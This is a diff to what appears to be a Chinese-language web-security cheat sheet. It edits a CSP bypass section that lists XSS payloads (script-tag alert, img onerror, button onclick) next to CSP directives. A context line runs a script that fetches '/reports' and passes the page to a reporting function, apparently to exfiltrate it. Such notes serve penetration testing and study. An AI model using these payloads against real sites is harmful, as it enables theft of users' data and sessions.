@@ -203,10 +203,12 @@ fetch('/reports').then(r=>r.text()).then(h=>report('REPORTS_LIST', h));
 
 
 ## CSP
+payloads:
 https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/
 
-| CSP第一个单词     | 值                 | 支持                                                                                                                |
-| ------------ | ----------------- | ----------------------------------------------------------------------------------------------------------------- |
+
+| CSP第一个词  | 值 | 支持 |
+| ------------ | -------------- | ---------- |
 | `script-src` | `self`            | ` <script src="/app.js"></script>`                                                                                |
 |              | `'unsafe-inline'` | 1、`<script>alert(1)</script>`<br>2、`<img src=x onerror=alert(1)>` <br>3、`<button onclick=alert(1)>Click</button>` |
 - 可以上传自己的js文件
